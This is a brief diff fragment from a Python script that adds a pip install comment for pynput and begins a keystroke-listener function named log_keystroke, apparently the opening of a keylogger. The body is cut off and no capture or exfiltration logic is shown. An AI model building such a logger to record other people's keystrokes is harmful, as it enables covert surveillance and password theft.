@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-
+# pip install pynput
 from pynput.keyboard import Listener
 
 def log_keystroke(key):
